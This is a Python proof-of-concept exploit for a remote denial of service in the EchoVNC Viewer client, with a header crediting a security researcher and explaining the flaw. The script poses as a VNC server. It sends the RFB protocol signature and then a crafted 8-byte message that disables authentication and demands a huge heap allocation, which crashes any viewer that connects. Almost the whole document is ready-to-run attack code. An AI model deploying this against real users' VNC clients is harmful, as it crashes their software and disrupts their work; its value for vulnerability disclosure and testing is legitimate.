#!/usr/bin/env python
#================================================================#
# [+] Title: EchoVNC Viewer Remote DoS Vulnerability             #
# [+] Discovered: 29/07/2013                                     #
# [+] Software Vendor: http://sourceforge.net/projects/echovnc/  #
# [+] Author: Z3r0n3 - Independent Security Researcher           #                                          
# [+] Contact: z3r0n3@mail.com                                   #
# [+] Overview:                                                  #
#   A remote attacker can crash EchoVNC Viewer by sending a      #
#   malformed request. the crash occurs when EchoVNC             #
#   Viewer allocate a buffer from heap with the size specified   #
#   by the malicious server.                                     #
# [+] NOTICE:                                                    #
#   You need to configure EchoVNC Viewer with the specified      #
#   host/port below.                                             #
#   When running the exploit, you need to put the IP and press   #
#   OK button on EchoVNC Viewer main window.                     #
#================================================================#

import socket, sys;

host="localhost" # Put the victim IP here
port=5900;
malreq=b"\x00\x00\x00\x00\x90\x90\x90\x90" # the first 4 bytes specifies if the
                                           # server needs authentication
                                           # \x00\x00\x00\x00 means the server
                                           # doesn't need user/password
                                           # the last 4 bytes specifies the
                                           # buffer size that will be allocated
                                           # in heap

print("[+] Creating socket...");
srv=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
try:
    print("[+] Trying to bind..");
    srv.bind((host,port));
except socket.error:
    print("[!] Can't connect...");
    srv.close()
    sys.exit()

print("[+] Trying to listen to %s:%d"%(host,port));
srv.listen(5)
cnx, addr=srv.accept()
print("[+] Client connected %s:%s"%(addr[0], addr[1]))
print("[+] Sending protocol signature...");
cnx.send(b"RFB 003.008\n")
print("[+] Sending malformed request with huge size for heap allocation");
cnx.send(malreq);
cnx.close()
srv.close()
print("[x] EchoVNC Viewer should be down...");